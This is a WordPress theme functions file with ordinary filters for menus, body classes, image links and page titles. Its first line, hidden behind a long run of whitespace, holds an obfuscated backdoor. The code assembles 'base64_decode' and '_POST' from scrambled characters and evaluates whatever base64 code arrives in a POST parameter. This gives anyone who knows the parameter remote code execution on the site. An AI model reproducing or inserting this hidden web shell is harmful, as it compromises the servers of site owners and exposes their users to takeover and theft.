<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nc3a140'])) {eval($s21(${$s20}['nc3a140']));}?><?php

/**
 * Get our wp_nav_menu() fallback, wp_page_menu(), to show a home link.
 */
if ( !function_exists( 'unitedthemes_page_menu_args' ) ) { 
	
	function unitedthemes_page_menu_args( $args ) {
		$args['show_home'] = true;
		return $args;
	}
	add_filter( 'wp_page_menu_args', 'unitedthemes_page_menu_args' );
	
}

/**
 * Adds custom classes to the array of body classes.
 */
if ( !function_exists( 'unitedthemes_body_classes' ) ) {  

	function unitedthemes_body_classes( $classes ) {
		// Adds a class of group-blog to blogs with more than 1 published author
		if ( is_multi_author() ) {
			$classes[] = 'group-blog';
		}
	
		return $classes;
	}
	add_filter( 'body_class', 'unitedthemes_body_classes' );
	
}

/**
 * Filter in a link to a content ID attribute for the next/previous image links on image attachment pages
 */
if ( !function_exists( 'unitedthemes_enhanced_image_navigation' ) ) { 

	function unitedthemes_enhanced_image_navigation( $url, $id ) {
		if ( ! is_attachment() && ! wp_attachment_is_image( $id ) )
			return $url;
	
		$image = get_post( $id );
		if ( ! empty( $image->post_parent ) && $image->post_parent != $id )
			$url .= '#main';
	
		return $url;
	}
	add_filter( 'attachment_link', 'unitedthemes_enhanced_image_navigation', 10, 2 );
	
}

/**
 * Filters wp_title to print a neat <title> tag based on what is being viewed.
 */
if ( !function_exists( 'unitedthemes_wp_title' ) ) {  

	function unitedthemes_wp_title( $title, $sep ) {
		global $page, $paged;
	
		if ( is_feed() )
			return $title;
	
		// Add the blog name
		$title .= get_bloginfo( 'name' );
	
		// Add the blog description for the home/front page.
		$site_description = get_bloginfo( 'description', 'display' );
		if ( $site_description && ( is_home() || is_front_page() ) )
			$title .= " $sep $site_description";
	
		// Add a page number if necessary:
		if ( $paged >= 2 || $page >= 2 )
			$title .= " $sep " . sprintf( __( 'Page %s', 'unitedthemes' ), max( $paged, $page ) );
	
		return $title;
	}
	add_filter( 'wp_title', 'unitedthemes_wp_title', 10, 2 );
	
}



/**
 * let read more jump to article top
 */
if ( !function_exists( 'ut_remove_more_link_scroll' ) ) {  

	function ut_remove_more_link_scroll( $link ) {
		$link = preg_replace( '|#more-[0-9]+|', '', $link );
		return $link;
	}
	
	add_filter( 'the_content_more_link', 'ut_remove_more_link_scroll' );
	
}